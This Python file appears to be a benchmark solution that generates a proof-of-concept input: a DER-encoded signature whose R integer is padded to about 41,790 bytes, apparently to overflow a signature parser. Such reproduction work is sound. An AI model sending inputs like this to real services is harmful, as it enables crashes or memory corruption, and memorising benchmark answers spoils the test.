import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        total_len = 41798
        content_len = total_len - 4  # outer: 0x30 0x82 <len_hi> <len_lo>
        r_len = content_len - 7      # R: 0x02 0x82 <len_hi> <len_lo> + R + S: 0x02 0x01 0x01

        out = bytearray()
        # SEQUENCE header
        out.append(0x30)
        out.append(0x82)
        out.append((content_len >> 8) & 0xFF)
        out.append(content_len & 0xFF)

        # INTEGER R with long length
        out.append(0x02)
        out.append(0x82)
        out.append((r_len >> 8) & 0xFF)
        out.append(r_len & 0xFF)
        out.extend(b'\x01' * r_len)

        # INTEGER S = 1
        out.append(0x02)
        out.append(0x01)
        out.append(0x01)

        # Ensure exact length
        if len(out) != total_len:
            # Adjust if necessary (should not happen with the calculations above)
            if len(out) > total_len:
                out = out[:total_len]
            else:
                out.extend(b'\x00' * (total_len - len(out)))

        return bytes(out)